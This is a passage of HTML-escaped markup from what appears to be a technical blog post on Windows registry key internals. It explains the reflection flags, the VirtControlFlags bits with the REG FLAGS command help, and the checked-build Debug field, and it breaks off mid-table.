class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md%23user-flags&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but in short, this was where reflection-specific configuration was internally saved by API functions such as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenablereflectionkey&quot;&gt;RegEnableReflectionKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdisablereflectionkey&quot;&gt;RegDisableReflectionKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and retrieved by &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryreflectionkey&quot;&gt;RegQueryReflectionKey&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;However, this specific use seems to have been short-lived, as Registry Reflection &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/win7appqual/removal-of-windows-registry-reflection&quot;&gt;was soon deprecated&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;in Windows 7. Since then, it could indeed be considered as four extra bits of user-controlled storage per key, accessible for reading via NtQueryKey(KeyFlagsInformation) and for writing via NtSetInformationKey(KeyWow64FlagsInformation). Beyond being interesting for historical reasons, the field doesn&amp;#39;t play any important role in security.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.m7cl4gtrghsz&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;VirtControlFlags&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This field is another one introduced around Windows XP SP3 / Windows Vista that took over some of the space from MaxNameLen. It is related to Registry Virtualization and takes up four bits in the _CM_KEY_NODE structure definition, but there are only three flags that it can really store:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c43 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Mask&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c23 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c39 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c43&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c23&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;REG_KEY_DONT_VIRTUALIZE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Disables virtualization for the specific key.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c43&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c23&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c51&quot;&gt;REG_KEY_DONT_SILENT_FAIL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Prevents the system from re-opening a virtualized key with MAXIMUM_ACCESS if the initial Open operation with the desired access rights has failed.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c43&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c23&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c51 MvcjwGOuIU-c83&quot;&gt;REG_KEY_RECURSE_FLAG&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Causes new subkeys of the key to inherit its virtualization-related configuration.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The flags are not sanitized in any way during hive load and so may be set to arbitrary values. They can also be modified programmatically by using the NtSetInformationKey(KeyControlFlagsInformation) system call, or even from the Windows command line, by using the REG FLAGS command:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;C:\&amp;gt;reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;/?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;REG&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;FLAGS&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyName&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[QUERY&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SET&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[DONT_VIRTUALIZE]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[DONT_SILENT_FAIL]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[RECURSE_FLAG]]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[/reg:32&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;/reg:64]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Keyname&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;quot;HKLM\Software&amp;quot;[\SubKey]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;(Restricted&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;these&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;on&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;only).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKey&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;full&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;registry&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;under&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;HKLM\Software.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;DONT_VIRTUALIZE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;DONT_SILENT_FAIL&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;RECURSE_FLAG&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Used&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SET;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;specified&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;will&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;set,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;those&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;specified&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;will&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;cleared.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;/reg:32&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Specifies&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;should&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;accessed&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;32-bit&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;registry&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;view.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;/reg:64&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Specifies&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;should&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;accessed&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;64-bit&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;registry&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;view.&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;More information about these flags can be found in the documentation of the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/orsetvirtualflags&quot;&gt;ORSetVirtualFlags&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;API function, a part of the Offline Registry Library. In the context of registry security research, I haven&amp;#39;t found them particularly interesting &amp;ndash; the other virtualization-related flags in the &amp;quot;Flags&amp;quot; field have proved to be much more useful in that regard.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.8n4biur37sx7&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Debug&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In Debug/Checked builds of Windows, it used to be possible to have the kernel trigger a breakpoint when performing a specific operation on a specific registry key. To enable the option, an administrator would have to set the &amp;nbsp;HKLM\System\CurrentControlSet\Control\Session Manager\Configuration Manager\RegDebugBreaksEnabled value to 1, which would propagate to the global kernel CmpRegDebugBreakEnabled variable. Then, the &amp;quot;Debug&amp;quot; field of each key would store a bitmask indicating which subset of eight possible operations should be interrupted for the given key:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c88&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c44&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Mask&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x01&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
